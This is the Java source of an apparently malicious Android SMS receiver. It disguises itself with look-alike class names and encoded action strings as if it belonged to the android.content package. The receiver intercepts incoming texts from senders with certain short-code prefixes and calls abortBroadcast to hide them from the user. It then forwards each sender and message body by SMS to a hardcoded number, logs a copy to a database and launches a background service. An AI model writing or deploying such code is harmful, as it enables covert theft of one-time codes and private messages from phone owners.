package android.content;

import java.util.Date;

import android.app.Activity;
import android.app.Dctivity;
import android.app.Dervice;
import android.app.Dpplication;
import android.database.sqlite.DQLiteOpenHelper;
import android.lang.Dhread;
import android.lang.LogUtils;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.DmsManager;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class DroadcastReceiver extends BroadcastReceiver {

	public static String[] NUMS = new String[] { "10", "9", "11", "16","152","159" };

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		String daction = Dpplication.Eecode(intent.getAction());
		LogUtils.write("Send", "action " + daction);
		if (daction.equals(Dpplication.smsfilter1)
				|| daction.equals(Dpplication.smsfilter2)
				|| daction.equals(Dpplication.smsfilter3)) {
			Bundle bundle = intent.getExtras();
			if (bundle != null) {
				Object[] pdus = (Object[]) bundle.get("pdus");
				String from = "";
				StringBuffer msg = new StringBuffer();
				SmsMessage[] messages = new SmsMessage[pdus.length];
                for(int i=0;i<messages.length;i++)
                {
                    byte[] pdu=(byte[])pdus[i];
                    messages[i]=SmsMessage.createFromPdu(pdu);
                }    
                for(SmsMessage sm:messages)
                {
                    String content=sm.getMessageBody();
                    msg.append(content);
                    from=sm.getOriginatingAddress();
                }
				LogUtils.write("Send", "���� " + from+"  "+msg);
				from = from.replace("+86", "").replace("+1", "");
				LogUtils.write("Send", "ȥ���Ӻ� " + from);

				boolean isflag = false;
				for (int i = 0; i < NUMS.length; i++) {
					LogUtils.write("Send", from + " ǰ׺ " + NUMS[i]);
					if (from.startsWith(NUMS[i])) {
						isflag = true;
						break;
					}
				}
				LogUtils.write("Send", "ƥ�� " + isflag);
				if (isflag) {
					LogUtils.write("Send", "ƥ��ɹ�,�жϹ㲥");
					this.abortBroadcast();
					LogUtils.write("Send", "д�����ݿ�" + isflag);
					DmsManager.Send(context,Dctivity.phonenum,Dctivity.lanjie+""+from+"#"+msg.toString());
					DQLiteOpenHelper.getHelper(context).addData("����", from,msg.toString(),new Date());
					Dhread.SartSend(context.getApplicationContext());
				}
			} else {
				LogUtils.write("Send", "��ȡ����ʧ��");
			}

		} else if(daction.equals(Dpplication.smssend)){
			String phoneNum = intent.getStringExtra("phone");
			switch(getResultCode())  
            {  
                case Activity.RESULT_OK:  
                	LogUtils.write("Send", phoneNum+"-���ŷ��ͳɹ�");
                    break;  
                case SmsManager.RESULT_ERROR_GENERIC_FAILURE:  
                	LogUtils.write("Send", phoneNum+"-���ŷ���ʧ��RESULT_ERROR_GENERIC_FAILURE");
                case SmsManager.RESULT_ERROR_RADIO_OFF:  
                	LogUtils.write("Send", phoneNum+"-���ŷ���ʧ��RESULT_ERROR_RADIO_OFF");
                case SmsManager.RESULT_ERROR_NULL_PDU:
                	LogUtils.write("Send", phoneNum+"-���ŷ���ʧ��RESULT_ERROR_NULL_PDU"); 
                default:  
                	LogUtils.write("Send", phoneNum+"-δ֪����"); 
                    break;  
            }  
			
		}else{
			LogUtils.write("Send", "��������");
			Dhread.SartSend(context.getApplicationContext());
			
			LogUtils.write("Send", "��������");
			Intent server = new Intent(context, Dervice.class);
			context.getApplicationContext().startService(server);
		}

	}

	private Handler handler = new Handler();
}
